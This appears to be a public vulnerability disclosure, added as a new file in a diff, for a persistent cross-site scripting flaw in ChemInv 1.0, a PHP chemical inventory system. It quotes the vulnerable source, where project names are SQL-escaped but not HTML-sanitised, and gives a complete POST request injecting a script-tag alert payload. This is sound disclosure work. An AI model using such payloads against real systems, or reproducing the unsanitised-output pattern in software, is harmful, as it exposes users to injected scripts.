@@ -1,0 +1,55 @@
+# Exploit Title: ChemInv 1.0 - Authenticated Persistent Cross-Site Scripting
+# Exploit Author: Bobby Cooke
+# Date: 2020-04-29
+# Software Link: https://github.com/tmorrell/cheminv
+# Software Info: 
+# "Cheminv is a web-based chemical inventory system. This responsive database provides an accessible way to organize and order chemicals, and is provided as an open-source package for all non-commercial users."
+# "Cheminv was created by Thomas Morrell for the Haw Yang Lab at Princeton University"
+# "Cheminv is based on ecDB www.ecDB.net, which was created by Nils Fredriksson aka. ElectricMan and designed by Buildlog."
+# Version: 1
+# Tested On: CentOS
+# Vulnerability Type: 
+# ChemInv suffers from a persistent cross-site scripting vulnerability(XSS). This vulnerability can be exploited to have all users of the system, with read access to the project, execute malicious client-side code; every time the users views the 'Projects' or 'Add Chemicals' tab.
+# The application's source code mitigates SQL injection (SQLi), but fails to sanitize HTML and JavaScript injections to the SQL database. 
+
+# Vulnerable Source Code
+## proj_list.php
+ 33                  include('include/include_proj_add.php');
+ 34                         $AddProj = new ProjAdd;
+ 35                         $AddProj->AddProj();
+ 36                         
+ 37                         $proj_query = mysql_query("SELECT * FROM projects WHERE project_owner= $owner");
+## include/include_proj_add.php
+  2 class ProjAdd {
+  3     public function AddProj () {
+  4
+  5         require_once('include/login/auth.php');
+  6         include('include/mysql_connect.php');
+  7
+  8         if(isset($_POST['submit'])) {
+  9             $owner          =   $_SESSION['SESS_MEMBER_ID'];
+ 10             $name           =   mysql_real_escape_string($_POST['name']);
+ 11
+ 12             if ($name == '') {
+ 13                 echo '<div class="message red">';
+ 14                 echo 'You have to specify a name!';
+ 15                 echo '</div>';
+ 16             }
+ 17             else {
+ 18                 $sql="INSERT into projects (project_owner, project_name) VALUES ('$owner', '$name')";
+ 19                 $sql_exec = mysql_query($sql);
+
+# Malicious POST Request to https://TARGET/proj_list.php
+  POST /proj_list.php HTTP/1.1
+  Host: TARGET
+  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate
+  Referer: https://TARGET/proj_list.php
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 16
+  Connection: close
+  Cookie: PHPSESSID=7af5kg3to8fstfum0to1ukpb85
+  
+  name=evilProject<script>alert('XSS');</script>&submit=
